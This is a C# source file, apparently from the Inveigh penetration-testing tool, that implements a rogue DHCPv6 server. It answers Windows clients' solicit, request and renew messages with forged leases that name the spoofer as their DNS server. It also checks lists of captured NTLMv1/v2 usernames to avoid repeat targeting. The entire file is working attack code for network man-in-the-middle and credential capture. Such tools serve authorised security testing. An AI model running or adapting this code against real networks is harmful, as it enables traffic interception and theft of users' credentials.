using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DHCPv6
    {        

        public static void DHCPv6Listener(string ipv6)
        {
            IPAddress destinationIPAddress = IPAddress.Parse(ipv6);
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(ipv6), 547);
            UdpClient udpClient = UDP.UDPListener("DHCPv6", "IPv6", Program.argIPv6, 547);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    DHCPv6Reply("listener", null, udpPayload, null, destinationIPAddress, ipEndPoint, udpClient);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] DHCPv6 spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void DHCPv6Reply(string method, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            int sourcePortNumber = 0;

            if (String.Equals(method, "listener"))
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;
            }

            string sourceIP = sourceIPAddress.ToString();
            byte[] messageTypeID = new byte[1];
            Buffer.BlockCopy(payload, 0, messageTypeID, 0, 1);
            byte[] clientMACData = new byte[6];
            Buffer.BlockCopy(payload, 22, clientMACData, 0, 6);
            string clientMAC = BitConverter.ToString(clientMACData).Replace("-", ":");
            byte[] serverMACData = new byte[6];
            Buffer.BlockCopy(payload, 36, serverMACData, 0, 6);
            string serverMAC = BitConverter.ToString(serverMACData).Replace("-", ":");
            byte[] IAID = new byte[4];

            if ((int)messageTypeID[0] == 1)
            {
                Buffer.BlockCopy(payload, 32, IAID, 0, 4);
            }
            else
            {
                Buffer.BlockCopy(payload, 46, IAID, 0, 4);
            }

            byte[] clientIPData = new byte[16];
            string leaseIP = "";
            string FQDN = clientMAC;
            bool existingLease = false;

            if ((int)messageTypeID[0] == 1 || (int)messageTypeID[0] == 3 || (int)messageTypeID[0] == 5)
            {
                int i = 0;

                for (i = 12; i < payload.Length; i++)
                {

                    if (Util.UInt16DataLength(i, payload) == 39)
                    {
                        FQDN = Util.ParseNameQuery((i + 4), payload);
                    }

                }

                int index = BitConverter.ToString(payload).Replace("-", String.Empty).IndexOf("4D53465420352E30"); // todo check this

                if (index >= 0)
                {

                    if ((int)messageTypeID[0] == 5)
                    {
                        leaseIP = sourceIPAddress.ToString().Split('%')[0];
                        clientIPData = IPAddress.Parse(leaseIP).GetAddressBytes();

                        foreach (string host in Program.hostList)
                        {
                            string[] hostArray = host.Split(',');

                            if (!String.IsNullOrEmpty(hostArray[0]) && String.Equals(FQDN, hostArray[0]))
                            {
                                existingLease = true;
                            }

                        }

                    }
                    else
                    {

                        foreach (string host in Program.hostList)
                        {
                            string[] hosts = host.Split(',');

                            if (!String.IsNullOrEmpty(hosts[0]) && String.Equals(FQDN, hosts[0]))
                            {
                                leaseIP = hosts[2];
                                clientIPData = IPAddress.Parse(leaseIP).GetAddressBytes();
                                existingLease = true;
                            }

                        }

                    }

                    if (String.IsNullOrEmpty(leaseIP))
                    {
                        leaseIP = "fe80::" + Program.dhcpv6Random + ":" + Program.dhcpv6IPIndex;
                        clientIPData = IPAddress.Parse(leaseIP).GetAddressBytes();
                        Program.dhcpv6IPIndex++;
                    }

                    if (!existingLease)
                    {
                        string slaacIP = "";

                        if (!String.Equals(sourceIPAddress.ToString().Split('%')[0], leaseIP))
                        {
                            slaacIP = sourceIPAddress.ToString().Split('%')[0];
                        }

                        lock (Program.hostList)
                        {
                            Program.hostList.Add(FQDN + "," + slaacIP + "," + leaseIP);
                        }

                        lock (Program.hostFileList)
                        {
                            Program.hostFileList.Add(FQDN + "," + slaacIP + "," + leaseIP);
                        }

                    }

                }

                string responseMessage = DHCPv6.DHCPv6Output(clientMAC, FQDN, leaseIP, sourceIP, serverMAC, index, messageTypeID[0]);

                if (String.Equals(responseMessage, "response sent"))
                {
                    byte[] response = DHCPv6.GetDHCPv6Response(method, sourceIPAddress, clientIPData, payload);

                    if (String.Equals(method, "sniffer"))
                    {
                        UDP.UDPSnifferClient("IPv6", 547, sourceIPAddress, sourcePortNumber, response);
                    }
                    else
                    {
                        UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, response);
                    }

                }

            }

        }

        public static byte[] GetDHCPv6Response(string type, IPAddress sourceIPAddress, byte[] clientIP, byte[] udpPayload)
        {
            byte[] domainSuffixData = Util.NewDNSNameArray(Program.argDHCPv6DNSSuffix, true);
            byte[] messageTypeID = new byte[1];
            Buffer.BlockCopy(udpPayload, 0, messageTypeID, 0, 1);
            byte[] transactionID = new byte[3];
            Buffer.BlockCopy(udpPayload, 1, transactionID, 0, 3);
            byte[] clientIdentifier = new byte[18];
            Buffer.BlockCopy(udpPayload, 10, clientIdentifier, 0, 18);
            byte[] clientMACData = new byte[6];
            Buffer.BlockCopy(udpPayload, 22, clientMACData, 0, 6);
            string clientMAC = BitConverter.ToString(clientMACData).Replace("-", ":");
            byte[] iAID = new byte[4];

            if ((int)messageTypeID[0] == 1)
            {
                Buffer.BlockCopy(udpPayload, 32, iAID, 0, 4);
            }
            else
            {
                Buffer.BlockCopy(udpPayload, 46, iAID, 0, 4);
            }

            MemoryStream memoryStream = new MemoryStream();

            if (String.Equals(type, "sniffer"))
            {
                memoryStream.Write((new byte[2] { 0x02, 0x23 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x02, 0x22 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            if ((int)messageTypeID[0] == 1)
            {
                memoryStream.Write((new byte[1] { 0x02 }), 0, 1);
            }
            else if ((int)messageTypeID[0] == 3)
            {
                memoryStream.Write((new byte[1] { 0x07 }), 0, 1);
            }
            else if ((int)messageTypeID[0] == 5)
            {
                memoryStream.Write((new byte[1] { 0x07 }), 0, 1);
            }

            memoryStream.Write(transactionID, 0, transactionID.Length);
            memoryStream.Write(clientIdentifier, 0, clientIdentifier.Length);
            memoryStream.Write((new byte[4] { 0x00, 0x02, 0x00, 0x0a }), 0, 4);
            memoryStream.Write((new byte[4] { 0x00, 0x03, 0x00, 0x01 }), 0, 4);
            memoryStream.Write(Program.macData, 0, Program.macData.Length);
            memoryStream.Write((new byte[4] { 0x00, 0x17, 0x00, 0x10 }), 0, 4);
            memoryStream.Write(Program.spooferIPv6Data, 0, Program.spooferIPv6Data.Length);

            if (!String.IsNullOrEmpty(Program.argDHCPv6DNSSuffix))
            {
                memoryStream.Write((new byte[2] { 0x00, 0x18 }), 0, 2);
                memoryStream.Write(Util.IntToByteArray2(domainSuffixData.Length), 0, 2);
                memoryStream.Write(domainSuffixData, 0, domainSuffixData.Length);
            }

            memoryStream.Write((new byte[4] { 0x00, 0x03, 0x00, 0x28 }), 0, 4);
            memoryStream.Write(iAID, 0, iAID.Length);
            memoryStream.Write((new byte[12] { 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x05, 0x00, 0x18 }), 0, 12);
            memoryStream.Write(clientIP, 0, clientIP.Length);
            memoryStream.Write((new byte[8] { 0x00, 0x00, 0x01, 0x2c, 0x00, 0x00, 0x01, 0x2c }), 0, 8);

            if (String.Equals(type, "sniffer"))
            {
                memoryStream.Position = 4;
                memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
                byte[] pseudoHeader = Util.GetIPv6PseudoHeader(sourceIPAddress, 17, (int)memoryStream.Length);
                UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, memoryStream.ToArray());
                memoryStream.Position = 6;
                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                Array.Reverse(packetChecksum);
                memoryStream.Write(packetChecksum, 0, 2);
            }

            return memoryStream.ToArray();
        }

        public static string DHCPv6Output(string clientMAC, string FQDN, string leaseIP, string sourceIPAddress, string serverMAC, int vendorIndex, int messageTypeID)
        {
            string messageType = "";
            string responseMessage = "";
            string responseMessage2 = "";
            string host = FQDN.Split('.')[0].ToUpper();
            string mappedIP = "";
            bool isRepeat = false;
            string responseStatus = "-";

            if (!Program.enabledSpooferRepeat)
            {

                foreach (string capture in Program.ntlmv2UsernameList)
                {

                    if (!String.IsNullOrEmpty(capture.Split(',')[1]) && capture.Split(',')[1].StartsWith(host))
                    {
                        mappedIP = capture.Split(',')[0];
                    }

                }

                if (String.IsNullOrEmpty(mappedIP))
                {

                    foreach (string capture in Program.ntlmv1UsernameList)
                    {

                        if (!String.IsNullOrEmpty(capture.Split(',')[1]) && capture.Split(',')[1].StartsWith(host))
                        {
                            mappedIP = capture.Split(',')[0];
                        }

                    }

                }

                if (!String.IsNullOrEmpty(mappedIP))
                {

                    foreach (string capture in Program.ntlmv2UsernameList)
                    {

                        if (capture.StartsWith(mappedIP) && !capture.EndsWith("$"))
                        {
                            isRepeat = true;
                        }

                    }

                    foreach (string capture in Program.ntlmv1UsernameList)
                    {

                        if (capture.StartsWith(mappedIP) && !capture.EndsWith("$"))
                        {
                            isRepeat = true;
                        }

                    }

                }

            }

            if (Program.enabledInspect)
            {
                responseMessage = "inspect only";
            }
            else if (Program.argSpooferMACsIgnore != null && Program.argSpooferMACsIgnore.Length > 0 && (Array.Exists(Program.argSpooferMACsIgnore, element => element == clientMAC.Replace(":",""))))
            {
                responseMessage = String.Concat(clientMAC, " is on ignore list");
            }
            else if (Program.argSpooferMACsReply != null && Program.argSpooferMACsReply.Length > 0 && (!Array.Exists(Program.argSpooferMACsReply, element => element == clientMAC.Replace(":", ""))))
            {
                responseMessage = String.Concat(clientMAC, " not on reply list");
            }
            else if(isRepeat)
            {
                responseMessage = String.Concat("previous ", mappedIP, " capture");
            }
            else if (!Program.enabledDHCPv6Local && String.Equals(clientMAC, Program.argMAC))
            {
                responseMessage = "local request";
            }
            else if (messageTypeID == 5 && !String.Equals(serverMAC, Program.argMAC))
            {
                responseMessage = "server mismatch";
            }
            else if (!Program.enabledDHCPv6 && messageTypeID == 1)
            {
                responseMessage = "spoofer disabled";
            }
            else if (vendorIndex < 0)
            {
                responseMessage = "vendor ignored";
            }
            else if (messageTypeID == 1)
            {
                responseMessage = "response sent";         
            }
            else if (messageTypeID == 3)
            {            
                responseMessage = "response sent";   
            }
            else if (messageTypeID == 5)
            {
                responseMessage = "response sent";
            }

            switch (messageTypeID)
            {

                case 1:
                    messageType = "solicitation";
                    responseMessage2 = "advertised";
                    break;

                case 3:
                    messageType = "request";
                    responseMessage2 = "leased";
                    break;

                case 5:
                    messageType = "renew";
                    responseMessage2 = "renewed";
                    break;

            }

            if(String.Equals(responseStatus,"response sent"))
            {
                responseStatus = "+";
            }

            lock (Program.outputList)
            {

                if (!String.IsNullOrEmpty(FQDN))
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] DHCPv6 {2} from {3}({4}) [{5}]", responseStatus, DateTime.Now.ToString("s"), messageType, sourceIPAddress, FQDN, responseMessage));
                }
                else
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] DHCPv6 {2} from {3} [{4}]", responseStatus, DateTime.Now.ToString("s"), messageType, sourceIPAddress, responseMessage));
                }

                if (String.Equals(responseMessage, "response sent"))
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] DHCPv6 {2} {3} to {4}", responseStatus, DateTime.Now.ToString("s"), leaseIP, responseMessage2, clientMAC));
                }
                else if (!responseMessage.EndsWith(" list") && !responseMessage.EndsWith(" capture") && !String.Equals(responseMessage,"local request"))
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] DHCPv6 client MAC {2} {3}", responseStatus, DateTime.Now.ToString("s"), clientMAC, responseMessage)); // todo better way to filter?
                }

            }

            return responseMessage;
        }

    }

}
